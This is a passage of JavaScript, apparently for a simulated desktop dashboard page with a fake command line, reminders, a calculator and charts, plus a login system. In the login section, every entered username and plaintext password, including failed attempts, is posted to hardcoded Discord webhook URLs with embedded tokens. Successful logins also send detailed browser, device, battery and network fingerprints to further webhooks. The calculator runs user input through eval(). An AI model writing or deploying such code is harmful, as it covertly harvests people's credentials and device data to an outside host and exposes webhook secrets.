  systeminfo - Displays system information (simulated).
  tasklist   - Lists running processes (simulated).
  notepad    - Opens the notepad tool.
  calculator - Opens the calculator tool.
  reminders  - Manages reminders.`;
                      break;
                  case 'echo':
                      output = args.join(' ');
                      break;
                  case 'ls':
                      output = this.simulateLs(this.currentDirectory);
                      break;
                  case 'cd':
                      if (args.length === 0) {
                          output = 'Usage: cd <directory>';
                      } else {
                          const newDir = args[0]; // Simplified directory change
                          if (newDir === '..' && this.currentDirectory !== 'C:\\') {
                              this.currentDirectory = this.currentDirectory.substring(0, this.currentDirectory.lastIndexOf('\\'));
                              if (this.currentDirectory === '') this.currentDirectory = 'C:\\'; // Handle root case
                          } else if (newDir !== '' && !newDir.includes('\\')) { // Basic validation
                              this.currentDirectory = `${this.currentDirectory}${this.currentDirectory.endsWith('\\') ? '' : '\\'}${newDir}`;
                          } else {
                              output = `Error: Directory "${newDir}" not found or invalid.`;
                          }
                          updatePrompt(); // Update prompt after directory change
                      }
                      break;
                  case 'clear':
                      cliOutput.innerHTML = '';
                      return; // Don't print "clear" command itself
                  case 'pwd':
                      output = this.currentDirectory;
                      break;
                  case 'systeminfo':
                      output = `
System Information (Simulated):
-----------------------------
OS Name:              Windows 11 Pro (Simulated)
OS Version:           10.0.22621 Build 22621
Manufacturer:         Microsoft Corporation
System Model:         Virtual Machine
Processor:            Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz
RAM:                  16 GB
Graphics Card:        NVIDIA GeForce RTX 3080 (Simulated)
IP Address:           192.168.1.100 (Simulated)
User Name:            Administrator
Home Directory:       C:\\Users\\Admin
-----------------------------`;
                      break;
                  case 'tasklist':
                      // This would ideally call a function to populate a task list or fetch simulated data.
                      // For now, a simple message.
                      output = 'Simulating task list display...';
                      this.togglePanel('taskManagerPanel'); // Open task manager
                      break;
                  case 'notepad':
                      this.showTool('notepad');
                      output = 'Opening Notepad...';
                      break;
                  case 'calculator':
                      this.showTool('calculator');
                      output = 'Opening Calculator...';
                      break;
                  case 'reminders':
                      this.togglePanel('reminderPanel');
                      output = 'Navigating to Reminders...';
                      break;
                  default:
                      output = `Command not found: '${command}'. Type 'help' for a list of commands.`;
                      found = false;
                      break;
              }
              if (found) printOutput(output);
              updatePrompt(); // Ensure prompt is always shown for next command
          };
          
          cliInput.addEventListener('keydown', (e) => {
              if (e.key === 'Enter') {
                  executeCommand(cliInput.value);
                  cliInput.value = '';
              } else if (e.key === 'ArrowUp') {
                  e.preventDefault();
                  if (this.cliHistory.length > 0) {
                      this.cliHistoryIndex--;
                      if (this.cliHistoryIndex < 0) this.cliHistoryIndex = 0;
                      cliInput.value = this.cliHistory[this.cliHistoryIndex];
                  }
              } else if (e.key === 'ArrowDown') {
                  e.preventDefault();
                  if (this.cliHistory.length > 0) {
                      this.cliHistoryIndex++;
                      if (this.cliHistoryIndex >= this.cliHistory.length) {
                          this.cliHistoryIndex = this.cliHistory.length - 1;
                          cliInput.value = '';
                      } else {
                          cliInput.value = this.cliHistory[this.cliHistoryIndex];
                      }
                  }
              }
          });
          
          updatePrompt(); // Set initial prompt
      },
      
      simulateLs: function(directory) {
          // This is a simplified simulation. A real file explorer would manage state better.
          if (directory === 'C:\\') {
              return 'Directory listing for C:\\ :\n  Desktop     <DIR>\n  Applications <DIR>\n  Downloads   <DIR>\n  config.sys  FILE    45 bytes';
          } else if (directory === 'C:\\Users\\Admin') {
              return 'Directory listing for C:\\Users\\Admin :\n  Desktop     <DIR>\n  Documents   <DIR>\n  Downloads   <DIR>';
          } else if (directory === 'C:\\Users\\Admin\\Desktop') {
              return 'Directory listing for C:\\Users\\Admin\\Desktop :\n  README.txt  FILE    19 bytes\n  My Documents <DIR>';
          } else if (directory === 'C:\\Users\\Admin\\Documents') {
              return 'Directory listing for C:\\Users\\Admin\\Documents :\n  Report.docx FILE    25 KB\n  Images      <DIR>';
          } else if (directory === 'C:\\Users\\Admin\\Downloads') {
              return 'Directory listing for C:\\Users\\Admin\\Downloads :\n  installer.exe FILE    1.2 MB';
          } else if (directory === 'C:\\Applications') {
              return 'Directory listing for C:\\Applications :\n  System Tools <DIR>';
          } else if (directory === 'C:\\Applications\\System Tools') {
              return 'Directory listing for C:\\Applications\\System Tools :\n  (Empty)';
          }
          return `Error: Directory "${directory}" not found.`;
      },
      
      // Reminder System
      initReminderSystem: function() {
          this.reminders = []; // Array to store reminders
          this.reminderCheckInterval = setInterval(() => this.checkReminders(), 10000); // Check every 10 seconds
          
          document.getElementById('addReminderBtn').addEventListener('click', () => this.addReminder());
          document.getElementById('reminderList').addEventListener('click', (e) => {
              if (e.target.classList.contains('complete-reminder')) this.completeReminder(e.target.closest('li'));
              if (e.target.classList.contains('delete-reminder')) this.deleteReminder(e.target.closest('li'));
          });
          
          this.displayReminders(); // Initial display
      },
      
      addReminder: function() {
          const textInput = document.getElementById('reminderText');
          const dateTimeInput = document.getElementById('reminderDateTime');
          
          const text = textInput.value.trim();
          const dateTimeStr = dateTimeInput.value;
          
          if (!text || !dateTimeStr) {
              alert('Please enter reminder details and select a date/time.');
              return;
          }
          
          const reminderDateTime = new Date(dateTimeStr);
          
          this.reminders.push({ text, dateTime: reminderDateTime, id: Date.now(), completed: false });
          this.displayReminders();
          textInput.value = '';
          dateTimeInput.value = '';
          
          this.checkReminders(); // Check immediately after adding
      },
      
      displayReminders: function() {
          const list = document.getElementById('reminderList');
          list.innerHTML = ''; // Clear existing
          
          this.reminders.sort((a, b) => a.dateTime - b.dateTime); // Sort by date
          
          this.reminders.forEach(rem => {
              const li = document.createElement('li');
              li.dataset.id = rem.id;
              const isPastDue = new Date() > rem.dateTime && !rem.completed;
              
              li.style.borderLeft = isPastDue ? '3px solid red' : (rem.completed ? '3px solid grey' : '3px solid #ff914d');
              
              li.innerHTML = `
                  <span>${rem.text} - ${rem.dateTime.toLocaleString()}</span>
                  <div class="reminder-actions">
                      <button class="complete-reminder" title="Mark as Complete">${rem.completed ? '✔️' : '✅'}</button>
                      <button class="delete-reminder" title="Delete Reminder">🗑️</button>
                  </div>
              `;
              list.appendChild(li);
          });
      },
      
      completeReminder: function(liElement) {
          const id = parseInt(liElement.dataset.id);
          const reminder = this.reminders.find(r => r.id === id);
          if (reminder) {
              reminder.completed = !reminder.completed; // Toggle completion
              this.displayReminders();
          }
      },
      
      deleteReminder: function(liElement) {
          const id = parseInt(liElement.dataset.id);
          this.reminders = this.reminders.filter(r => r.id !== id);
          this.displayReminders();
          this.checkReminders(); // Re-check upcoming
      },
      
      checkReminders: function() {
          const now = new Date();
          let upcoming = null;
          
          this.reminders.forEach(rem => {
              if (!rem.completed && rem.dateTime > now) {
                  if (!upcoming || rem.dateTime < upcoming.dateTime) {
                      upcoming = rem;
                  }
              }
          });
          
          const nextReminderInfo = document.getElementById('nextReminderInfo');
          if (upcoming) {
              nextReminderInfo.textContent = `Next: ${upcoming.text} at ${upcoming.dateTime.toLocaleString()}`;
              // Simple visual notification (optional: could be a pop-up)
              if (upcoming.dateTime - now < 60000 && !upcoming.notified) { // If within 1 minute and not yet notified
                  alert(`Reminder: ${upcoming.text}`);
                  upcoming.notified = true; // Mark as notified
              }
          } else {
              nextReminderInfo.textContent = 'No upcoming reminders.';
          }
      },
      
      // System Tools
      initSystemTools: function() {
          document.querySelector('#calculatorTool .buttons').addEventListener('click', (e) => {
              if (e.target.tagName === 'BUTTON' && !e.target.classList.contains('operator') && !e.target.classList.contains('clear') && !e.target.classList.contains('equals')) {
                  this.updateCalculator(e.target.textContent);
              } else if (e.target.classList.contains('operator')) {
                  this.updateCalculator(e.target.textContent);
              } else if (e.target.classList.contains('clear')) {
                  this.clearCalculator();
              } else if (e.target.classList.contains('equals')) {
                  this.calculateResult();
              }
          });
          document.getElementById('saveNotepad').addEventListener('click', () => this.saveNotepad());
          document.getElementById('clearNotepad').addEventListener('click', () => this.clearNotepad());
          document.getElementById('setAlarm').addEventListener('click', () => this.setAlarm());
          document.getElementById('timerControlBtn').addEventListener('click', () => this.toggleTimer());
      },
      
      showTool: function(toolName) {
          document.querySelectorAll('.tool-detail-view').forEach(view => view.style.display = 'none');
          const toolView = document.getElementById(`${toolName}Tool`);
          if (toolView) {
              toolView.style.display = 'block';
              toolView.scrollIntoView({ behavior: 'smooth' });
          }
      },
      
      // Calculator Logic
      calculatorValue: '',
      updateCalculator: function(value) {
          this.calculatorValue += value;
          document.getElementById('calculatorDisplay').value = this.calculatorValue;
      },
      clearCalculator: function() {
          this.calculatorValue = '';
          document.getElementById('calculatorDisplay').value = '';
      },
      calculateResult: function() {
          try {
              const result = eval(this.calculatorValue); // Use eval cautiously!
              document.getElementById('calculatorDisplay').value = result;
              this.calculatorValue = result.toString();
          } catch (e) {
              document.getElementById('calculatorDisplay').value = 'Error';
              this.calculatorValue = '';
          }
      },
      
      // Notepad Logic
      saveNotepad: function() {
          const content = document.getElementById('enhancedNotepad').value;
          // In a real app, this would save to storage or server.
          alert('Notepad content saved (simulated).');
          console.log("Notepad content:", content);
      },
      clearNotepad: function() {
          if (confirm('Are you sure you want to clear the notepad?')) {
              document.getElementById('enhancedNotepad').value = '';
          }
      },
      
      // Alarm & Timer Logic
      alarms: [],
      timerInterval: null,
      timerValue: 0, // in seconds
      timerRunning: false,
      
      setAlarm: function() {
          const timeInput = document.getElementById('alarmTimeInput');
          const alarmTime = timeInput.value;
          if (!alarmTime) {
              alert('Please select a time for the alarm.');
              return;
          }
          
          const alarm = { time: alarmTime, id: Date.now() };
          this.alarms.push(alarm);
          this.displayAlarms();
          timeInput.value = '';
          alert(`Alarm set for ${alarmTime}.`);
      },
      displayAlarms: function() {
          const list = document.getElementById('alarmListDisplay');
          list.innerHTML = '';
          this.alarms.forEach(alarm => {
              const li = document.createElement('li');
              li.textContent = `Alarm at ${alarm.time}`;
              list.appendChild(li);
          });
      },
      
      startTimer: function() {
          if (this.timerRunning) {
              clearInterval(this.timerInterval);
              this.timerRunning = false;
              document.getElementById('timerControlBtn').textContent = 'Start';
              return;
          }
          
          const minutesInput = document.getElementById('timerMinutesInput');
          const minutes = parseInt(minutesInput.value);
          if (isNaN(minutes) || minutes <= 0) {
              alert('Please enter a valid number of minutes (greater than 0).');
              return;
          }
          
          this.timerValue = minutes * 60;
          this.timerRunning = true;
          document.getElementById('timerControlBtn').textContent = 'Stop';
          this.updateTimerDisplay();
          this.timerInterval = setInterval(() => this.tickTimer(), 1000);
      },
      
      toggleTimer: function() { // Renamed from startTimer to be more generic for the button click
          if (this.timerRunning) {
              clearInterval(this.timerInterval);
              this.timerRunning = false;
              document.getElementById('timerControlBtn').textContent = 'Start';
          } else {
              this.startTimer(); // Call the actual start logic
          }
      },
      
      tickTimer: function() {
          if (this.timerValue <= 0) {
              clearInterval(this.timerInterval);
              this.timerRunning = false;
              document.getElementById('timerDisplay').textContent = '00:00';
              document.getElementById('timerControlBtn').textContent = 'Start';
              alert('Timer finished!');
              return;
          }
          this.timerValue--;
          this.updateTimerDisplay();
      },
      
      updateTimerDisplay: function() {
          const mins = Math.floor(this.timerValue / 60);
          const secs = this.timerValue % 60;
          document.getElementById('timerDisplay').textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
      },
      
      // Data Visualization
      initDataVisualization: function() {
          this.cpuChart = this.createChart('cpuChartCanvas', 'CPU Usage (%)', 'rgb(76, 175, 80)');
          this.networkChart = this.createChart('networkChartCanvas', 'Network Download (Kbps)', 'rgb(255, 87, 34)');
          this.memoryChart = this.createChart('memoryChartCanvas', 'RAM Usage (GB)', 'rgb(33, 150, 243)');
      },
      
      createChart: function(canvasId, label, color) {
          const ctx = document.getElementById(canvasId).getContext('2d');
          // Ensure chart.js is loaded before creating charts
          if (typeof Chart === 'undefined') {
              console.error('Chart.js is not loaded.');
              return null;
          }
          
          const chartData = {
              labels: Array(10).fill(''), // Placeholder labels
              datasets: [{
                  label: label,
                  data: Array(10).fill(0), // Placeholder data
                  borderColor: color,
                  backgroundColor: color + '33', // Semi-transparent fill
                  fill: true,
                  tension: 0.1,
                  pointRadius: 0 // Hide points for a cleaner line
              }]
          };
          
          const config = {
              type: 'line',
              data: chartData,
              options: {
                  responsive: true,
                  maintainAspectRatio: false,
                  scales: {
                      y: { beginAtZero: true }
                  },
                  animation: {
                      duration: 500 // Smoother animations
                  }
              }
          };
          return new Chart(ctx, config);
      },
      
      updateCharts: function(data) {
          const updateDataset = (chart, newDataPoint, newLabel = '') => {
              if (!chart) return;
              const dataset = chart.data.datasets[0];
              dataset.data.push(newDataPoint);
              if (newLabel) chart.data.labels.push(newLabel);
              
              // Keep only the last N data points (e.g., 10)
              const maxDataPoints = 10;
              if (dataset.data.length > maxDataPoints) {
                  dataset.data.shift();
                  if (chart.data.labels.length > maxDataPoints) chart.data.labels.shift();
              }
              chart.update();
          };
          
          const now = new Date();
          const timeLabel = `${now.getHours()}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
          
          updateDataset(this.cpuChart, data.cpuUsage, timeLabel);
          updateDataset(this.networkChart, data.networkDown, timeLabel);
          updateDataset(this.memoryChart, data.ramUsed, timeLabel);
      }
    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5; // Global attempts counter
      let users = []; // To store whitelist data
      let loginTime = null; // Timestamp of successful login

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
          console.log('User whitelist loaded successfully.');
        })
        .catch((error) => {
          users = [];
          console.error('Failed to load user JSON data:', error);
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch (e) {
          console.warn("WebGL Renderer check failed:", e);
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch (e) {
            console.warn("Battery status check failed:", e);
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        if (!users || users.length === 0) return null; // Return null if users data is not loaded
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
          if (!response.ok) {
            console.warn(`Webhook send failed for ${url}: ${response.status} ${response.statusText}`);
          }
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logEvent(webhookKey, title, color, fields) {
          const embed = {
              title: title,
              color: color,
              fields: [
                  ...fields,
                  { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
              ]
          };
          await sendWebhook(loggingWebhooks[webhookKey], embed);
      }
      
      async function logUsername(name, username) {
          await logEvent('username', 'Username Logging', 0x3498db, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }]);
      }
      async function logPassword(name, password) {
          await logEvent('password', 'Password Logging', 0xe74c3c, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }]);
      }
      async function logIdentifier(name, identifier) {
          await logEvent('identifier', 'Identifier Logging', 0x2ecc71, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }]);
      }
      async function logInvalidUsername(name, username) {
          await logEvent('invalid_username', 'Invalid Username Logging', 0xf39c12, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }]);
      }
      async function logInvalidPassword(name, password) {
          await logEvent('invalid_password', 'Invalid Password Logging', 0xe67e22, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }]);
      }
      async function logInvalidIdentifier(name, identifier) {
          await logEvent('invalid_identifier', 'Invalid Identifier Logging', 0xd35400, [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }]);
      }
      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
          await logEvent('attempts_counter', 'Attempts Counter Logging', 0x9b59b6, [
              { name: "Name", value: name || "N/A", inline: true },
              { name: "Username", value: username, inline: true },
              { name: "Password", value: password, inline: true },
              { name: "Identifier", value: identifier, inline: true },
              { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }
          ]);
      }
      async function logAttemptsExceeded(name, username, password, identifier) {
          await logEvent('attempts_exceeded', 'Attempts Exceeded Logging', 0xc0392b, [
              { name: "Name", value: name || "N/A", inline: true },
              { name: "Username", value: username, inline: true },
              { name: "Password", value: password, inline: true },
              { name: "Identifier", value: identifier, inline: true },
              { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }
          ]);
      }

      // Original embed builders (for the 5 main webhooks)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(null, username); // Pass null for name if user not found
          await logInvalidIdentifier(null, userID);
          handleFailedAttempt('User not found or identifier mismatch.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 5; // Reset attempts
        updateAttemptsText();
        errorMsg.textContent = '';
        hideResetPopup(); // Ensure popup is hidden
        loginBox.classList.remove('flashing'); // Remove flashing class if present
        loginBox.style.borderColor = 'white'; // Reset border
        loginBox.style.boxShadow = '0 0 15px white'; // Reset shadow

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks concurrently
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Show dashboard and hide login
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.className = 'dashboard-body'; // Apply dashboard body classes
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
